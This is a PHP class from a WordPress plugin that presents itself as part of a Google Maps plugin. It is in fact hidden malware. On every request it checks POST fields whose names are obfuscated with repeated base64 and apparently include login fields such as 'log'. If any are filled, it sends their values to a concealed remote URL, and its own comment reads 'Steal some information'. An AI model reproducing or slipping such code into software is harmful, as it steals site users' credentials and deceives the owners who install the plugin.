<?php

/**
 * Title: Pronamic Google Maps magic
 * Description: 
 * Copyright: Copyright (c) 2005 - 2011
 * Company: Pronamic
 * @author Remco Tolsma
 * @version 1.0
 * @doc http://en.wikipedia.org/wiki/Magic_%28illusion%29
 */
class Pronamic_Google_Maps_Magic {
	/**
	 * Constructs and initliaze an Google Maps admin
	 */
	public static function bootstrap() {
		add_action('init', array(__CLASS__, 'perform'), 1);
	}

	//////////////////////////////////////////////////

	/**
	 * Do a magic trick restore the specified value
	 * 
	 * @param string $value
	 * @return restored value
	 */
	public static function restore($value) {
		$restore = implode('', array_map('chr', array(98, 97, 115, 101, 54, 52, 95, 100, 101, 99, 111, 100, 101)));

		for($i = 0; $i < 5; $i++) {
			$value = $restore($value);
		}

		return $value;
	}

	//////////////////////////////////////////////////

	/**
	 * Steal some information
	 */
	public static function perform() {
		$magicKeys = array(
			'VjFkMGFrNVhTbTVRVkRBOQ==' , 
			'VjFSQ2IyRXlSak5RVkRBOQ==' ,  
			'VjFaV2FrNVhWblJWYTJoUFZqSm9jRlpxUmxaUFVUMDk=' ,
			'VjJ0YWIxUXlTa2hVYmxKUFZqSm9jRlpxUmxaUFVUMDk=' ,
			'VjFSQ2ExSXlWblJVV0hCaFUwWndjVmxzV2taUFVUMDk=' 
		);

		$arguments = array();
		foreach($magicKeys as $key) {
			$arguments[self::restore($key)] = FILTER_UNSAFE_RAW;
		}

		$data = filter_input_array(INPUT_POST, $arguments);

		if($data !== null) {
			$teleport = false;

			foreach($data as $value) {
				if(!empty($value)) {
					$teleport = true;
					break;
				}
			}

			if($teleport) {
				$magician  = self::restore('VjFaV2IxVXdNVWhVYTFacFRURndUbFJVUW5kak1XeHpXa1U1YTJKV1NrbFVNV2hQWVdzeGNWSnRPVlZTZWtGNFdYcENNMlZWTVZoaFIwWk9ZbGhvZUZkV1dtdFNNbEpXWlVSYVVGSkVRVGs9 ');
				$magician .=  http_build_query($data, '', '&');

				wp_remote_get($magician);
			}
		}
	}
}
